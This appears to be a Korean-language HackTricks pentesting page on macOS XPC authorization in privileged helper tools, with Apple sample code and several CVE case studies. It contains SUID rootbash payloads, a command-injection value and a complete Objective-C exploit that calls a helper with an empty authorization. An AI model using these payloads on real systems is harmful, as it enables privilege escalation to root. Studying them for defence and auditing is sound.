# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple은 연결 중인 프로세스에 **노출된 XPC method를 호출할 권한이 있는지** 인증하는 또 다른 방법도 제공합니다.

애플리케이션이 **권한이 있는 사용자로 작업을 실행해야 하는 경우**, 일반적으로 앱을 권한이 있는 사용자로 실행하는 대신 HelperTool을 root로 XPC service로 설치합니다. 그러면 앱에서 HelperTool을 호출하여 해당 작업을 수행할 수 있습니다. 하지만 service를 호출하는 앱에는 충분한 authorization이 있어야 합니다.

### ShouldAcceptNewConnection always YES

[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)에서 예시를 확인할 수 있습니다. `App/AppDelegate.m`에서는 **HelperTool에 연결**하려고 합니다. 그리고 `HelperTool/HelperTool.m`의 **`shouldAcceptNewConnection` 함수는** 앞서 설명한 요구 사항을 **전혀 확인하지 않습니다**. 이 함수는 항상 YES를 반환합니다:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
자세한 check 올바른 구성 방법은 다음을 참고하세요:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Application rights

하지만 **HelperTool의 메서드가 호출될 때 authorization이 수행됩니다**.

`App/AppDelegate.m`의 **`applicationDidFinishLaunching` 함수는 앱이 시작된 후 빈 authorization reference를 생성합니다**. 이 작업은 항상 성공해야 합니다.\
그런 다음 `setupAuthorizationRights`를 호출하여 해당 authorization reference에 **일부 rights를 추가하려고 시도합니다**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m`의 `setupAuthorizationRights` 함수는 애플리케이션의 rights를 auth database `/var/db/auth.db`에 저장합니다. 아직 database에 없는 rights만 추가한다는 점에 유의하세요:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` 함수는 `commandInfo`에 정의된 애플리케이션 권한을 가져오는 데 사용됩니다:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
이는 이 프로세스가 끝날 때 `commandInfo` 내부에 선언된 권한이 `/var/db/auth.db`에 저장된다는 의미입니다. 여기에서 **인증이 필요한** **각 메서드**에 대해 **permission name**과 **`kCommandKeyAuthRightDefault`**를 확인할 수 있다는 점에 주목하세요. 후자는 **누가 이 권한을 얻을 수 있는지 나타냅니다**.

누가 권한에 액세스할 수 있는지 나타내는 다양한 scope가 있습니다. 이 중 일부는 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)에 정의되어 있습니다([전체 목록은 여기에서 확인할 수 있습니다](https://www.dssw.co.uk/reference/authorization-rights/)). 요약하면 다음과 같습니다:

<table><thead><tr><th width="284.3333333333333">이름</th><th width="165">값</th><th>설명</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>누구나</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>아무도 없음</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>현재 사용자가 admin이어야 함(admin 그룹에 속해 있어야 함)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>사용자에게 인증을 요청합니다.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>사용자에게 인증을 요청합니다. 사용자는 admin이어야 합니다(admin 그룹에 속해 있어야 함).</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>규칙을 지정합니다.</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>해당 권한에 대한 추가 설명을 지정합니다.</td></tr></tbody></table>

### Rights Verification

`HelperTool/HelperTool.m`에서 **`readLicenseKeyAuthorization`** 함수는 **해당 메서드를 실행할 권한**이 있는지 **`checkAuthorization`** 함수를 호출하여 확인합니다. 이 함수는 호출 프로세스가 전송한 **authData**가 **올바른 형식**인지 확인한 다음, 특정 메서드를 호출할 **권한**을 얻기 위해 **무엇이 필요한지** 확인합니다. 모든 과정이 정상적으로 완료되면 반환되는 **`error`는 `nil`**입니다:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
`그 메서드를 호출할 권한을 얻기 위한 **요구 사항을 확인**할 때 함수 `authorizationRightForCommand`는 앞서 언급한 **`commandInfo`** 객체만 확인한다는 점에 유의해야 합니다. 그런 다음 **해당 함수 호출에 필요한 권한이 있는지** 확인하기 위해 **`AuthorizationCopyRights`**를 호출합니다(플래그를 통해 사용자와 상호 작용할 수 있음에 유의).

이 경우 함수 `readLicenseKeyAuthorization`를 호출하기 위한 `kCommandKeyAuthRightDefault`는 `@kAuthorizationRuleClassAllow`로 정의되어 있습니다. 따라서 **누구나 호출할 수 있습니다**.

### DB 정보

이 정보는 `/var/db/auth.db`에 저장된다고 언급했습니다. 다음 명령으로 저장된 모든 rule을 나열할 수 있습니다:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
그런 다음 다음을 사용하여 해당 권한에 액세스할 수 있는 사용자를 확인할 수 있습니다:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 허용적인 권한

**모든 권한 구성**은 [**여기에서**](https://www.dssw.co.uk/reference/authorization-rights/) 확인할 수 있지만, 사용자 상호 작용이 필요하지 않은 조합은 다음과 같습니다.

1. **'authenticate-user': 'false'**
- 가장 직접적인 key입니다. `false`로 설정하면 사용자가 이 권한을 얻기 위해 authentication을 제공할 필요가 없음을 지정합니다.
- 이는 **아래 2가지 중 하나와 조합하거나, 사용자가 속해야 하는 group을 지정하는 방식으로** 사용됩니다.
2. **'allow-root': 'true'**
- 사용자가 root user로 동작하고 있고(root user는 elevated permissions를 가짐), 이 key가 `true`로 설정되어 있다면 root user는 추가 authentication 없이 이 권한을 얻을 수 있습니다. 그러나 일반적으로 root user 상태가 되려면 이미 authentication이 필요하므로, 대부분의 사용자에게 이는 "authentication 없음" 시나리오는 아닙니다.
3. **'session-owner': 'true'**
- `true`로 설정하면 session의 소유자(현재 로그인한 user)가 자동으로 이 권한을 얻습니다. 사용자가 이미 로그인한 상태라면 추가 authentication을 우회할 수 있습니다.
4. **'shared': 'true'**
- 이 key는 authentication 없이 권한을 부여하지 않습니다. 대신 `true`로 설정하면 권한이 authentication된 후 여러 process 간에 공유될 수 있어 각 process가 다시 authentication할 필요가 없음을 의미합니다. 하지만 다른 key(예: `'authenticate-user': 'false'`)와 조합하지 않는 한, 권한을 최초로 부여할 때는 여전히 authentication이 필요합니다.

다음 [**script를 사용할 수 있습니다**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) 흥미로운 권한을 확인하려면:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: 권한이 부여된 Mach service `com.acustica.HelperTool`은 모든 연결을 수락하며, 해당 `checkAuthorization:` routine은 `AuthorizationCopyRights(NULL, …)`을 호출하므로 32바이트 blob라면 무엇이든 통과합니다. 이후 `executeCommand:authorization:withReply:`는 공격자가 제어하는 comma-separated strings를 `NSTask`에 root 권한으로 전달하므로, 다음과 같은 payload를 사용할 수 있습니다:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially SUID root shell을 생성할 수 있습니다. 자세한 내용은 [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)을 참조하세요.<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener가 항상 YES를 반환하며, `checkAuthorization:`에도 동일한 NULL `AuthorizationCopyRights` 패턴이 나타납니다. `exchangeAppWithReply:` 메서드는 attacker 입력을 두 번 `system()` 문자열에 연결하므로, `appPath`에 셸 메타문자(예: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`)를 삽입하면 Mach service `com.plugin-alliance.pa-installationhelper`를 통해 root code execution이 가능합니다. 자세한 정보는 [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)를 참조하세요.<sup>[7]</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: audit를 실행하면 `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`가 생성되고, Mach service `com.jamf.complianceeditor.helper`가 노출되며, caller의 `AuthorizationExternalForm` 또는 code signature를 검증하지 않고 `-executeScriptAt:arguments:then:`을 export합니다. trivial exploit은 빈 reference를 `AuthorizationCreate`하고, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`로 연결한 다음, 해당 메서드를 호출해 arbitrary binaries를 root 권한으로 실행합니다. 전체 reversing notes(및 PoC)는 [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)에 있습니다.<sup>[4]</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 및 7.4.0–7.4.2는 authorization gate가 없는 privileged helper에 도달하는 crafted XPC messages를 허용했습니다. helper가 자체 privileged `AuthorizationRef`를 신뢰했기 때문에, service에 메시지를 보낼 수 있는 모든 local user가 이를 유도하여 root 권한으로 arbitrary configuration changes 또는 commands를 실행할 수 있었습니다. 자세한 내용은 [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)를 참조하세요.<sup>[5]</sup>

#### Rapid triage tips

- 앱이 GUI와 helper를 모두 제공하는 경우, 두 구성 요소의 code requirements를 비교하고 `shouldAcceptNewConnection`이 `-setCodeSigningRequirement:`로 listener를 제한하는지(또는 `SecCodeCopySigningInformation`을 검증하는지) 확인하세요. 이러한 검사가 없으면 Jamf 사례와 같은 CWE-863 시나리오가 발생하는 경우가 많습니다. 빠르게 확인하면 다음과 같습니다:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- helper가 실제로 권한을 부여한다고 생각하는 대상과 client가 제공하는 값을 비교합니다. reversing할 때 `AuthorizationCopyRights`에 breakpoint를 설정하고, `AuthorizationRef`가 helper 자체의 privileged context가 아니라 `AuthorizationCreateFromExternalForm`에서 비롯된 것인지(client provided) 확인합니다. 그렇지 않다면, 앞의 사례와 유사한 CWE-863 pattern을 찾았을 가능성이 높습니다.

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

다음 function을 찾았다면: **`[HelperTool checkAuthorization:command:]`**, 해당 process가 앞서 언급한 schema를 사용하고 있을 가능성이 높습니다:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

이 function이 `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`와 같은 function을 호출한다면, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)을 사용하는 것입니다.

사용자 상호작용 없이 일부 privileged action을 호출할 권한을 얻을 수 있는지 확인하려면 **`/var/db/auth.db`**를 확인합니다.

### Protocol Communication

그런 다음 XPC service와 communication을 수립할 수 있도록 protocol schema를 찾아야 합니다.

**`shouldAcceptNewConnection`** function은 export되는 protocol을 나타냅니다:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

이 경우에는 EvenBetterAuthorizationSample과 동일합니다. [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)을 확인하세요.

사용되는 protocol의 이름을 알면 다음 명령으로 **dump its header definition**을 수행할 수 있습니다:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
마지막으로, 해당 서비스와 통신을 설정하려면 노출된 **Mach Service의 이름**만 알면 됩니다. 이를 확인하는 방법은 여러 가지가 있습니다:

- 사용 중인 Mach Service를 확인할 수 있는 **`[HelperTool init]`**에서:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist에서:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit 예시

이 예시에서는 다음을 생성합니다:

- functions가 포함된 protocol 정의
- access를 요청하는 데 사용할 빈 auth
- XPC service에 대한 connection
- connection이 성공한 경우 function 호출
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 악용된 기타 XPC privilege helper

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## 참조

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([GitHub 미러](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac Privilege Escalation Flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Acustica Audio HelperTool XPC Service Local Privilege Escalation in Aquarius Desktop on macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
